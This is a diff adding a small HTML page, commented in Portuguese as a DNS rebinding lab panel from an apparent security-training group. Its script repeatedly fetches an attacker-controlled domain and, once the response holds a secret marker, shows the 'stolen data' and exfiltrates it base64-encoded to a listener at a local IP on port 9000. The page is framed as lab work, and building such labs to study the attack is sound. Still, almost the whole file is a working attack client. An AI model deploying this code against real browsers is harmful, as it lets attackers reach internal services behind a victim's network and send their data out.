@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<!-- 
+################################################################
+#                                                              #
+# Pagina para testes do laboratorio de DNS Binding. Serve como #
+# um painel para ver o que esta se passando no lado do cliente #
+# enquanto corre o script na maquina alvo.                     #
+#                                                              #
+# Escrito por: Carlos Alexandre Menezes                        #
+# Last update on: 29/05/2026                                   #
+# Version: 1.4                                                 #
+# Megabytez CyberSec Labs                                      #
+#                                                              #
+################################################################
+-->
+<html>
+<head>
+    <title>Laboratorio DNS Rebinding</title>
+</head>
+<body>
+    <h1>Simulacao de DNS Rebinding</h1>
+    <p>O ataque esta a correr em segundo plano na VM...</p>
+    <div id="log"></div>
+
+    <script>
+        const logDiv = document.getElementById('log');
+        
+        function atacar() {
+            // O script tenta aceder à porta 8080 do domínio sob nosso controle
+            fetch('http://pudim-malicioso.com:8080')
+            .then(response => response.text())
+            .then(data => {
+                if (data.includes("CHAVE_SECRETA")) {
+                    logDiv.innerHTML += `<p style="color:green;"><b>[SUCESSO] Dados Roubados:</b> ${data}</p>`;
+                    // Exfiltra os dados de volta para a tua VM do VirtualBox na porta 9000
+                    fetch(`http://192.168.1.238:9000/exfiltrado?dados=${btoa(data)}`);
+                } else {
+                    logDiv.innerHTML += `<p style="color:orange;">A aguardar alteracao de IP no DNS...</p>`;
+                }
+            })
+            .catch(err => {
+                logDiv.innerHTML += `<p style="color:red;">Erro ou aguardando transicao...</p>`;
+            });
+        }
+
+        setInterval(atacar, 2000);
+    </script>
+</body>
+</html>
